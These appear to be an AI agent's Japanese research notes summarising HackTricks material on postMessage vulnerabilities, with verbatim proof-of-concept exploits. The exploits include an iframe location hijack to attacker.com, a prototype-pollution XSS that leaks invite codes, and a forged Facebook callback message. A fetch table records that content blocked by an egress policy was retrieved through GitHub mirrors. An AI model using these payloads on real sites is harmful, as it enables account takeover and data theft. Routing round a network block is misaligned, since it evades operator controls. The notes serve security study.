# [37] HackTricks - PostMessage Vulnerabilities（PostMessage の脆弱性）

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html | full | GitHub raw ソース（同一原文） | hacktricks.wiki への直接アクセスは egress プロキシで 403 ブロック。WebFetch も curl も不可。HackTricks はこのページを GitHub 上の Markdown から自動生成しているため、`raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/postmessage-vulnerabilities/README.md` から**同一の原文（22,593 bytes）を full 取得**した。 |
| （サブページ）bypassing-sop-with-iframes-1.md | full | GitHub raw ソース | 本文中 `{{#ref}}` で参照される子ページ。同一ディレクトリから取得（3,930 bytes）。 |
| （サブページ）bypassing-sop-with-iframes-2.md | full | GitHub raw ソース | 同上（7,681 bytes）。 |
| （サブページ）blocking-main-page-to-steal-postmessage.md | full | GitHub raw ソース | 同上（6,187 bytes）。 |
| （サブページ）steal-postmessage-modifying-iframe-location.md | full | GitHub raw ソース | 同上（2,969 bytes）。 |
| https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage | **full**（補完で回収） | GitHub raw ミラー（`mdn/content`） | developer.mozilla.org 本体は egress 403。MDN の原文は GitHub の `mdn/content` リポジトリで管理されているため `raw.githubusercontent.com/mdn/content/main/files/en-us/web/api/window/postmessage/index.md` から**同一原文を full 取得**。security concerns・targetOrigin 規則・注意事項を後述「## 補完で回収した一次資料」に逐語収録。 |
| https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging | **full**（補完で回収） | GitHub raw ミラー（`OWASP/CheatSheetSeries`） | owasp.org 本体は egress 403。原文は `raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/HTML5_Security_Cheat_Sheet.md` から full 取得。Web Messaging 節を後述に逐語収録。 |
| https://github.com/terjanq/same-origin-xss | **full**（補完で回収） | GitHub raw ミラー | github.com 本体は egress 403 だが `raw.githubusercontent.com/terjanq/same-origin-xss/master/README.md` は許可ホスト。soXSS writeup 全文を full 取得。子ページ A の内容を裏付ける一次ソースとして後述に narrative を追記。 |
| github.com/benso-io/posta（Posta 拡張） | full（補完で回収） | GitHub raw | 列挙ツール。README を後述「ツール詳細」に収録。 |
| github.com/fransr/postMessage-tracker（Frans Rosén） | full（補完で回収） | GitHub raw | 列挙ツール。README を後述に収録。 |
| github.com/PwnFunction/v8-randomness-predictor | full（補完で回収） | GitHub raw | `Math.random()` 予測（Z3）。README のワークフローを §3.13 補足として後述に収録。 |
| github.com/yavolo/eventlistener-xss-recon | full（補完で回収） | GitHub raw | リスナ列挙の recon 方法論。README を後述に収録。 |
| https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html | **failed**（回収できず） | — | jlajara.gitlab.io は egress 403（GitLab Pages）。GitHub 側にミラー無し（`jlajara/jlajara.gitlab.io` 等 404）。WebSearch 予算も枯渇（200/200）のため二次情報でも回収できず。読みどころのみ後述。 |
| https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html ほか ysamm 記事 3 本（[6][7][8]） | **failed**（回収できず） | — | ysamm.com は egress 403。個人ブログでミラー無し。ただし各記事の技術要点は HackTricks 本文（§3.11〜§3.13）が要約・コード付きで転載済み。読みどころは後述。 |
| https://portswigger.net/web-security/dom-based/.../lab-dom-xss-using-web-messages-and-a-javascript-url | **failed**（回収できず） | — | portswigger.net は egress 403。ラボの手法自体は HackTricks 本文 §3.3（`javascript:print()//http:`）で解説済み。読みどころは後述。 |
| その他外部リンク（karanbamal dev.to[2], GeekyCat[3], YesWeHack[12]） | failed | — | dev.to/web.archive.org/yeswehack.com いずれも egress 403 または未回収。 |

> 補足: hacktricks.wiki 本体・book.hacktricks.wiki・developer.mozilla.org・owasp.org・medium.com・web.archive.org・portswigger.net・jlajara.gitlab.io・ysamm.com はすべて組織のネットワーク egress ポリシーで 403（policy denial）。ポリシー拒否は迂回禁止（README 明記）のため、**403 ホストへの再試行はせず**、代わりに許可ホスト `raw.githubusercontent.com` 上の公開ソース／GitHub ミラーから**レンダリング前の原文 Markdown をそのまま**取得した。この補完で **MDN・OWASP・terjanq** の 3 本を failed→full に回収し、参照ツール 4 本の README も回収した。本ノート本文（HackTricks 原文）は GitHub raw から full 取得済みで公開ページと**完全に同一**、忠実度 full。捏造補完は一切行っていない（未回収 URL は「failed」と明記し、読みどころのみ記載）。

---

## 要約（原文の骨子）

- `postMessage` はウィンドウ／iframe／ポップアップ間でクロスオリジン通信を行う API。**送信側**の弱点は `targetOrigin` に `'*'`（ワイルドカード）を使い機密データを漏らすこと、**受信側**の弱点は `addEventListener('message', ...)` ハンドラの **origin 検証不備**である。
- 送信側攻撃: フレーム化可能（`X-Frame-Options`／CSP `frame-ancestors` 未設定）なページが `targetOrigin='*'` で機密メッセージを送ると、攻撃者は iframe/子フレームの location を攻撃者オリジンに書き換えてメッセージを窃取できる。ただし `targetOrigin` が具体的 URL の場合はこのトリックは効かない。
- 受信側 origin 検証バイパス集: `event.isTrusted` を認可に使う誤り、`indexOf()`／`String.prototype.search()`（正規表現化）／`match()` の甘い比較、`escapeHtml` が `hasOwnProperty` を持たないオブジェクトや `File.name` で回避される問題、`document.domain` の緩和。
- サブストリング（`http:`/`https:` 含有）チェックだけの navigation シンクは `javascript:...//http:` で XSS 可能。
- origin だけを信頼する設計は、信頼オリジン上に「リレー」ページや XSS があると破綻する（trusted relays／trusted-origin allowlist isn't a boundary）。実例として fbevents/CAPIG（Facebook/Meta）の OAuth コード窃取・ATO、Facebook SDK の `Math.random()` コールバックトークン予測による DOM XSS が挙げられる。
- SOP バイパス系: sandbox iframe による `origin=null` を使った `e.origin === null` / `window.origin === null` バイパス、iframe を送信直後に削除して `e.source` を `null` にするバイパス、DOM クロバリングによる `window.calc.contentWindow` の無効化。
- 窃取テクニック: メインページをブロックして子 iframe への機密 postMessage を横取り（ブロッキング gadget）、子 iframe の location 書き換えによる窃取、`X-Frame-Options` 回避のための `window.open` タブ経由通信。
- postMessage 経由の Prototype Pollution → XSS 連鎖。
- 列挙（enumeration）: `getEventListeners(window)`、DevTools の Event Listeners、Posta / postMessage-tracker 拡張。
- 防御: 送信は具体的 `targetOrigin`、受信は `event.origin` と（必要に応じ）`event.source` の厳密検証、`innerHTML` などシンクへの無検証投入の回避、framing 防止（`frame-ancestors`／`X-Frame-Options`）。

---

## 詳細ノート

### 1. PostMessage の送信（Send PostMessage）（出典: メインページ）

**PostMessage** は次の関数でメッセージを送る:

```
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

- 第1引数 `message`: 送るデータ（構造化クローンされる。文字列やオブジェクト、`ArrayBuffer` 等）。
- 第2引数 `targetOrigin`: 配信先オリジンの制約。`'*'`（ワイルドカード）か、`https://company.com` のような**正確なオリジン**を指定する。
- 第3引数 `[transfer]`: 転送可能オブジェクト（Transferable）のリスト（任意）。

`targetOrigin` の意味（原文の重要な定義）:

> `targetOrigin` can be `'*'` or an exact origin such as `https://company.com`. With an exact origin, the browser delivers the message only if the target window currently has that origin. With `'*'`, the message can be delivered regardless of the target window's current origin.

つまり、**正確なオリジン指定**の場合、対象ウィンドウが**現在その origin を持っているときにのみ**ブラウザはメッセージを配信する。**`'*'`** の場合、対象ウィンドウの現在の origin に関係なく配信されうる（→ 攻撃者オリジンに navigate 済みのフレームにも届いてしまう＝漏洩の元）。

#### コード（原文のまま逐語）— 各種 postMessage 送信方法

```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to a URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

ポイント:
- ペイロード例 `{"__proto__":{"isAdmin":True}}` は **Prototype Pollution** を狙った JSON（`__proto__` を汚染）。
- ポップアップ内の iframe に送るには `win.length == 1`（iframe がロードされる）まで**ループで待つ**必要がある。`win[0]` でポップアップ内の最初のフレームを参照する。
- `onload` を使って iframe ロード直後に `this.contentWindow.postMessage(...)` を送る手口も示される。

### 2. iframe への攻撃と targetOrigin のワイルドカード（Attacking iframe & wildcard in targetOrigin）（出典: メインページ）

原文の主張（逐語訳）:

> ページが**フレーム化可能**（有効な `X-Frame-Options` や CSP `frame-ancestors` 保護がない）で、かつワイルドカード `targetOrigin` で**機密メッセージ**を送っている場合、攻撃者は iframe を攻撃者制御のオリジンに navigate させ、そこでメッセージを受信できる。

重要な制約（逐語）:

> Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.

＝ フレーム化できても `targetOrigin` が**ワイルドカードでなく URL 指定**なら、このトリックは効かない。出典は Google VRP「Hijacking your screenshots」（GeekyCat、archived）。

#### コード（原文のまま逐語）— iframe の origin を書き換えて奪う PoC

```html
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s

      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```

解説: 6 秒待ってから 100ms ごとに、ネストされたフレーム（`window.frames[0].frame[0][2]`）の `location` を攻撃者ページへ書き換え続ける。ワイルドカード送信された機密メッセージが、書き換え後の攻撃者ドキュメントに届く。フレームインデックスはドキュメントツリーで変わるため実際の階層を確認する必要がある（後述の子ページ参照）。

### 3. addEventListener の悪用（addEventListener exploitation）（出典: メインページ）

JavaScript は **`addEventListener`** で `message` イベントを受けるハンドラを登録する。典型例:

#### コード（原文のまま逐語）

```javascript
window.addEventListener(
  "message",
  (event) => {
    if (event.origin !== "http://example.org:8080") return

    // ...
  },
  false
)
```

原文の指摘（逐語訳）: ハンドラはまず**送信元 origin をチェック**する。パスワード変更などの機微な操作を受信データが駆動する場合、これは必須である。**厳密な origin チェックがない**と、攻撃者は被害者ページに任意のメッセージデータをハンドラへ送らせることができる。

#### 3.1 列挙（Enumeration）（出典: メインページ）

現在のページ内のイベントリスナを**見つける**方法:

- JS コードを **検索**: `window.addEventListener` と `$(window).on`（JQuery 版）を探す。
- 開発者ツールのコンソールで **実行**: `getEventListeners(window)`
- ブラウザ開発者ツールの **Elements → Event Listeners** を見る。
- **ブラウザ拡張**を使う: [Posta](https://github.com/benso-io/posta) または [postMessage-tracker](https://github.com/fransr/postMessage-tracker)。これらはメッセージを傍受・表示する。

（原文には DevTools の `getEventListeners(window)` 実行例と Elements→Event Listeners のスクリーンショット画像が2枚挿入されている。画像そのものは取得対象外。）

#### 3.2 origin チェックのバイパス（Origin check bypasses）（出典: メインページ）

原文の列挙（逐語訳・要点保持）:

- **`event.isTrusted` を送信元の認可に使ってはならない。** これは「ブラウザがイベントをディスパッチしたか（対して JS が `dispatchEvent` を呼んだか）」を示すだけで、`MessageEvent` が信頼できる origin や真正なユーザー操作から来たことを**証明しない**。代わりに `event.origin`、必要なら `event.source` を検証する。（出典 [10] MDN Event.isTrusted）

- **`indexOf()`** による origin 検証はバイパスされうる。脆弱な例:

  ```javascript
  "https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
  ```
  （＝先頭一致の部分文字列を含むかを見るだけなので、`https://app-sj17.ma` を含む攻撃者ドメインで通ってしまう。）

- **`search()`** メソッド（`String.prototype.search()`）は**正規表現**用であり文字列用ではない。regexp 以外を渡すと暗黙に正規表現へ変換され、`.`（ドット）がワイルドカードとして働くため、細工したドメインで検証をバイパスできる。例:

  ```javascript
  "https://www.safedomain.com".search("www.s.fedomain.com")
  ```
  （`www.s.fedomain.com` の `.` が任意1文字にマッチ→ `www.safedomain.com` にマッチしてしまう。）

- **`match()`** も `search()` 同様に正規表現を処理する。正規表現が不適切だとバイパスされうる。

- **`escapeHtml`** 関数の問題: 入力の文字をエスケープしてサニタイズする意図だが、**新しいエスケープ済みオブジェクトを作らず、既存オブジェクトのプロパティを上書きする**。これが悪用できる。特に、制御下のプロパティが `hasOwnProperty` を持たないようにオブジェクトを細工できれば、`escapeHtml` は期待通り動かない。例:

  - Expected Failure（期待どおりエスケープされる例）:

    ```javascript
    result = u({
      message: "'\"<b>\\",
    })
    result.message // "&#39;&quot;&lt;b&gt;\"
    ```

  - Bypassing the escape（エスケープ回避）:

    ```javascript
    result = u(new Error("'\"<b>\\"))
    result.message // "'"<b>\"
    ```

  この文脈で **`File` オブジェクト**は特に悪用しやすい。読み取り専用の `name` プロパティを持つため、テンプレートで使われた際に `escapeHtml` でサニタイズされず、セキュリティリスクになりうる。

- **`document.domain`** プロパティは、スクリプトからドメインを短縮設定でき、同一親ドメイン内での**同一オリジンポリシーをより緩和**できる。

#### 3.3 message → navigation シンクにおける「サブストリング（scheme）チェック」（Substring scheme checks in message-to-navigation sinks）（出典: メインページ）

原文（逐語訳）: 受信側が `event.origin` を検証せず、`event.data` に `http:`/`https:` が**含まれるか**だけを確認してから `location.href` に代入する場合、サブストリングチェックは実際の URL スキームを制約しない。値の**先頭を `javascript:`** にし、必要なサブストリングを **JavaScript 行コメントの後ろ**に置けば、ブラウザは受信側オリジンで先頭の JavaScript URL を実行する。

#### コード（原文のまま逐語）

```html
<iframe
  src="https://target.example/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

解説（逐語訳）: ここで `http:` は `indexOf('http:') > -1` フィルタを満たすが、コメントテキストとして無視される。悪用には、(1) 対象ウィンドウへの参照（フレーム化可能なページ or ポップアップ）、(2) 攻撃者到達可能なリスナ、(3) `javascript:` URL を許す navigation シンク、が必要。出典 [11] PortSwigger Lab、[12] YesWeHack。

#### 3.4 origin だけの信頼 ＋ 信頼リレー（Origin-only trust + trusted relays）（出典: メインページ）

原文（逐語訳・要点保持）: 受信側が **`event.origin` だけ**をチェック（例: 任意の `*.trusted.com` を信頼）している場合、その origin 上で攻撃者制御のパラメータを `postMessage` でエコー（中継）する「リレー」ページを見つけられることが多い。例: クエリパラメータを受け取り、`{msg_type, access_token, ...}` を `opener`/`parent` に転送するマーケ／解析ガジェット。手口:

- **opener を持つ形で被害者ページをポップアップ/iframe で開く**（多くの pixel/SDK は `window.opener` が存在するときだけリスナを登録する）。
- **別の攻撃者ウィンドウを信頼オリジン上のリレーエンドポイントに navigate** し、注入したいメッセージフィールド（メッセージ種別・トークン・nonce）を埋める。
- メッセージは**信頼オリジンから**来るので origin-only 検証が通り、被害者リスナ内で特権動作（状態変更・API 呼び出し・DOM 書き込み）を起動できる。

実際に観測された悪用パターン（逐語訳）:

- 解析 SDK（例: pixel/fbevents 系）は `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを消費し、**メッセージ内で供給されたトークンでバックエンド API を呼ぶ**。その際リクエストボディに **`location.href` / `document.referrer`** を含める。自分のトークンを供給すれば**そのトークンのリクエスト履歴/ログでこれらのリクエストを読める**ため、被害者ページの URL/referrer に含まれる **OAuth code/token を exfil** できる。
- 任意フィールドを `postMessage` に反映するリレーは、特権リスナが期待する**メッセージ種別を偽装**できる。弱い入力検証と組み合わせると Graph/REST 呼び出し、機能アンロック、CSRF 相当のフローに到達できる。

ハンティングのコツ（逐語訳）: `event.origin` だけをチェックする `postMessage` リスナを列挙し、次に**同一オリジン上で URL パラメータを `postMessage` で転送する HTML/JS エンドポイント**（マーケプレビュー、ログインポップアップ、OAuth エラーページ）を探す。両者を `window.open()` + `postMessage` でつなぎ、origin チェックを回避する。

#### 3.5 e.origin == window.origin バイパス（出典: メインページ）

原文（逐語訳）: **sandboxed iframe** を使ってページを埋め込む場合、iframe の origin は `null` になることを理解するのが重要。

- sandbox 属性に **`allow-popups`** を指定すると、iframe から開いたポップアップは親 iframe の sandbox 制約を継承する。つまり **`allow-popups-to-escape-sandbox`** も含めない限り、ポップアップの origin も `null` に設定され、iframe の origin と一致する。
- したがって、この条件下でポップアップを開き、iframe からポップアップへ `postMessage` を送ると、**送信側・受信側ともに origin が `null`** になる。結果、**`e.origin == window.origin`** が真（`null == null`）と評価される。

詳細は子ページ `bypassing-sop-with-iframes-1.md`（本ノート後半参照）。

#### 3.6 e.source のバイパス（Bypassing e.source）（出典: メインページ）

メッセージがスクリプトのリスンしているウィンドウと同じウィンドウから来たかをチェックできる（特にブラウザ拡張の Content Script が「同一ページから送られたか」を確認するのに有用）:

#### コード（原文のまま逐語）

```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
  return
}
```

原文（逐語訳）: `postMessage` を送る **iframe を作り、送信直後に削除**することで、メッセージの **`e.source`** を **null** に強制できる。詳細は子ページ `bypassing-sop-with-iframes-2.md`（本ノート後半参照）。

#### 3.7 フレーミング防御のバイパス（Framing-protection bypass）（出典: メインページ）

原文（逐語訳）: これらの攻撃はしばしば被害者ページを `iframe` に置く必要があるが、`X-Frame-Options` と CSP `frame-ancestors` がフレーム化を防ぐ。その場合でも、目立つがより低ステルスな攻撃として、脆弱な Web アプリへ**新しいタブを開いて通信**できる。

#### コード（原文のまま逐語）

```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```

（出典 [2] karanbamal。2 秒待ってから開いたウィンドウ `w` へ postMessage する。）

#### 3.8 メインページをブロックして子への message を奪う（出典: メインページ → 子ページ）

原文（逐語訳）: 次のページで、**子 iframe** に送られる**機密 postMessage データ**を、データ送信前に**メインページをブロック**し、**子の XSS** を悪用してデータが受信される前に**リーク**して盗む方法が示される。詳細は子ページ `blocking-main-page-to-steal-postmessage.md`（本ノート後半参照）。

#### 3.9 iframe の location 変更による message 窃取（出典: メインページ → 子ページ）

原文（逐語訳）: フレーム化可能なページが別の iframe を含む場合、攻撃者は**子 iframe の location を変更**できることがある。その子がワイルドカード `targetOrigin` で送られた `postMessage` を受信するなら、攻撃者オリジンへ navigate させることでメッセージを露出できる。詳細は子ページ `steal-postmessage-modifying-iframe-location.md`（本ノート後半参照）。

#### 3.10 postMessage から Prototype Pollution および/または XSS へ（出典: メインページ）

原文（逐語訳）: `postMessage` で送られたデータが JS によって実行されるシナリオでは、**ページを iframe 化**し、`postMessage` でエクスプロイトを送ることで **prototype pollution/XSS を悪用**できる。

`postMessage` を通じた XSS の非常によく解説された例は jlajara の記事（[1]）にある。

Prototype Pollution → XSS を iframe への `postMessage` で悪用するエクスプロイト例:

#### コード（原文のまま逐語）

```html
<html>
  <body>
    <iframe
      id="idframe"
      src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function get_code() {
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(
            '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
            "*"
          )
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(JSON.stringify("refresh"), "*")
      }

      setTimeout(get_code, 2000)
    </script>
  </body>
</html>
```

解説: `__proto__.editedbymod.username` を汚染し、その値に `onerror` 付き `<img>` を埋め込む。汚染後に `"refresh"` を postMessage して再描画させると、汚染された username がテンプレートに反映され XSS が発火、`same-origin` credentials 付きで `/api/invitecodes` を fetch して invite code をリークする。

関連ページ（原文リンク）:
- Prototype Pollution: `../deserialization/nodejs-proto-prototype-pollution/index.html`
- XSS: `../xss-cross-site-scripting/index.html`
- client side prototype pollution to XSS: `../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss`

#### 3.11 origin 由来のスクリプト読み込み ＆ サプライチェーン pivot（CAPIG ケーススタディ）（出典: メインページ）

原文（逐語訳・要点保持）: `capig-events.js` は `window.opener` が存在するときだけ `message` ハンドラを登録した。`IWL_BOOTSTRAP` を受けると `pixel_id` をチェックするが、**`event.origin` を保存**し、後に `${host}/sdk/${pixel_id}/iwl.js` の組み立てに使った。（出典 [6] ysamm CAPIG）

#### コード（原文のまま逐語）— 攻撃者制御 origin を書き込むハンドラ

```javascript
if (window.opener) {
  window.addEventListener("message", (event) => {
    if (
      !localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
      !localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
      event.data.msg_type === "IWL_BOOTSTRAP" &&
      checkInList(g.pixels, event.data.pixel_id) !== -1
    ) {
      localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
        pixelID: event.data.pixel_id,
        host: event.origin,
        sessionStartTime: event.data.session_start_time,
      })
      startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
    }
  })
}
```

**Exploit（origin → script-src pivot）**（逐語訳）:
1. opener を得る: 例えば Facebook Android WebView では `window.open(target, name)` で `window.name` を再利用し、ウィンドウを自分自身の opener にする。その後、悪意ある iframe からメッセージを送る。
2. 任意オリジンから `IWL_BOOTSTRAP` を送り、`host = event.origin` を `localStorage` に永続化する。
3. `/sdk/<pixel_id>/iwl.js` を **CSP で許可された任意のオリジン**にホストする（whitelist された解析ドメインの乗っ取り/XSS/アップロード）。すると `startIWL()` が埋め込みサイト（例 `www.meta.com`）で攻撃者 JS を読み込み、credentialed なクロスオリジン呼び出しとアカウント乗っ取り（ATO）を可能にする。

直接の opener 制御が不可能でも、ページ上のサードパーティ iframe を侵害すれば、細工した `postMessage` を親へ送り保存 host を汚染してスクリプト読み込みを強制できた。

**Backend-generated shared script → stored XSS**（逐語訳）: プラグイン `AHPixelIWLParametersPlugin` はユーザールールのパラメータを `capig-events.js` に追記される JS に連結した（例 `cbq.config.set(...)`）。`"]}` のようなブレイクアウトを注入すると任意 JS を注入でき、当該共有スクリプトを読み込む全サイトに配信される stored XSS を作れた。

#### 3.12 信頼 origin の allowlist は境界にならない（Trusted-origin allowlist isn't a boundary）（出典: メインページ）

原文（逐語訳）: 厳密な `event.origin` チェックは、**信頼オリジンが攻撃者 JS を実行できない**場合にのみ有効。特権ページがサードパーティ iframe を埋め込み、`event.origin === "https://partner.com"` を安全と仮定する場合、`partner.com` の任意の XSS が親への橋渡しになる。（出典 [7] ysamm Self XSS Facebook Payments）

#### コード（原文のまま逐語）— 親（信頼ページ）の脆弱なハンドラ

```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
  if (e.origin !== "https://partner.com") return
  const [type, html] = e.data.split("|")
  if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```

実際に観測された攻撃パターン（逐語訳）:

1. **partner iframe の XSS を悪用**し、リレーガジェットを仕込む。これで任意の `postMessage` が信頼オリジン内でのコード実行になる:

```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```

2. **攻撃者ページから**、侵害した iframe へ JS を送り、許可されたメッセージ種別を親へ転送させる。メッセージは `partner.com` 由来なので allowlist を通り、安全でなく挿入される HTML を運ぶ:

```javascript
postMessage({
  cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```

3. 親が攻撃者 HTML を挿入し、**親オリジン（例 `facebook.com`）での JS 実行**を与える。これで OAuth code を盗んだり、完全な ATO フローへ pivot できる。

Key takeaways（逐語訳）:
- **partner origin は境界ではない**: 「信頼された」partner の任意 XSS で、攻撃者は `event.origin` チェックを回避する許可済みメッセージを送れる。
- **partner 制御ペイロードを描画**するハンドラ（特定メッセージ種別で `innerHTML`）は、partner 侵害を same-origin DOM XSS にする。
- 広い**メッセージ面**（多数の種別、構造検証なし）は、partner iframe 侵害後の pivot ガジェットを増やす。

#### 3.13 postMessage ブリッジにおける `Math.random()` コールバックトークンの予測（出典: メインページ）

原文（逐語訳・要点保持）: メッセージ検証が `Math.random()` 生成の「共有シークレット」（例 `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`）を使い、同じヘルパがプラグイン iframe の命名にも使われる場合、PRNG 出力を復元して信頼メッセージを偽造できる。（出典 [8] ysamm、[9] V8 randomness predictor）

- **`window.name` 経由で PRNG 出力をリーク**: SDK はプラグイン iframe を `guid()` で自動命名する。トップフレームを制御できるなら、被害者ページを iframe 化し、プラグイン iframe を自分のオリジンへ navigate（例 `window.frames[0].frames[0].location='https://attacker.com'`）して `window.frames[0].frames[0].name` を読み、生の `Math.random()` 出力を得る。
- **リロードなしで出力を増やす**: 一部 SDK は reinit パスを公開する。FB SDK では `init:post` を `{xfbml:1}` で発火させると `XFBML.parse()` が強制され、プラグイン iframe を破棄/再生成し、新しい名前/コールバック ID を生成する。reinit を繰り返せば必要なだけ PRNG 出力が得られる（コールバック/iframe ID 用に内部で追加の `Math.random()` 呼び出しがあるため、solver は間の値をスキップする必要がある）。
- **信頼オリジン配送（パラメータポリューション）**: first-party プラグインエンドポイントがサニタイズされないパラメータをクロスウィンドウペイロードに反映する場合（例 `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`）、信頼された `facebook.com` origin を保ったまま `&type=...&iconSVG=...` を注入できる。
- **次のコールバックを予測**: リークした iframe 名を `[0,1)` の float に戻し、複数値（非連続でも可）を V8 `Math.random` predictor（例 Z3 ベース）に入れる。次の `guid()` をローカルで生成して期待されるコールバックトークンを偽造する。
- **シンクを起動**: postMessage データを細工し、ブリッジが `xd.mpn.setupIconIframe` をディスパッチし `iconSVG` に HTML を注入（例 URL エンコードした `<img src=x onerror=...>`）させ、ホストオリジン内で DOM XSS を達成する。そこから same-origin iframe（OAuth ダイアログ、arbiter 等）を読める。
- **Framing の癖が役立つ**: このチェーンは framing を要する。一部モバイル webview では `frame-ancestors` が存在すると `X-Frame-Options` がサポート外の `ALLOW-FROM` に劣化することがあり、「compat」パラメータで許容的な `frame-ancestors` を強制でき、`window.name` サイドチャネルが有効になる。

#### コード（原文のまま逐語）— 偽造メッセージの最小例

```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
  callback +
  "&type=mpn.setupIconIframe&frameName=x" +
  "&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```

### 4. References（原文の参考文献一覧・逐語）（出典: メインページ）

- [1] DOM XSS PostMessage - jlajara: https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html
- [2] How to spot and exploit postMessage vulnerabilities - karanbamal: https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd
- [3] Google VRP: Hijacking your screenshots - GeekyCat (archived): https://web.archive.org/web/20230000000000id_/https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/
- [4] Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO: https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html
- [5] eventlistener-xss-recon (practice): https://github.com/yavolo/eventlistener-xss-recon
- [6] CAPIG postMessage origin trust → script loading + stored JS injection: https://ysamm.com/uncategorized/2025/01/13/capig-xss.html
- [7] Self XSS Facebook Payments: https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html
- [8] Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup: https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html
- [9] V8 Math.random() state recovery (Z3 predictor): https://github.com/PwnFunction/v8-randomness-predictor
- [10] MDN – Event.isTrusted: https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted
- [11] PortSwigger Lab: DOM XSS using web messages and a JavaScript URL: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
- [12] How to use Codex for Bug Bounty research: explore broadly, validate rigorously: https://www.yeswehack.com/learn-bug-bounty/llm-series-codex

---

## 詳細ノート（子ページ）

### 子ページ A: Bypassing SOP with Iframes - 1（`bypassing-sop-with-iframes-1.md`）（出典: 同ディレクトリ）

このチャレンジ（NDevTK と Terjanq 作）は、以下の message ハンドラの XSS を悪用するもの。

#### コード（原文のまま逐語）— 脆弱なハンドラ

```javascript
const identifier = "4a600cd2d4f9aa1cfb5aa786"
onmessage = (e) => {
  const data = e.data
  if (e.origin !== window.origin && data.identifier !== identifier) return
  if (data.type === "render") {
    renderContainer.innerHTML = data.body
  }
}
```

- メインページは通常の `data.body` フローを **DOMPurify** でサニタイズする。攻撃者制御 HTML をこのハンドラに送るには、`e.origin !== window.origin` チェックのバイパスが必要。
- 検証条件は `e.origin !== window.origin && data.identifier !== identifier`。**両方**が真だと return するので、**どちらか一方**を偽にすればよい（origin を一致させる or identifier を知る）。

#### SOP bypass 1（e.origin === null）（逐語訳）

`allow-same-origin` を欠く sandbox フラグの iframe に埋め込まれた文書は **opaque origin** を受け取る。そのメッセージング時のシリアライズ origin は **`null`** になる。したがって `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` でこのチャレンジが使う条件を強制できる。ページが**埋め込み可能**ならこの方法で保護をバイパスできる（cookie を `SameSite=None` に設定する必要もあるかもしれない）。

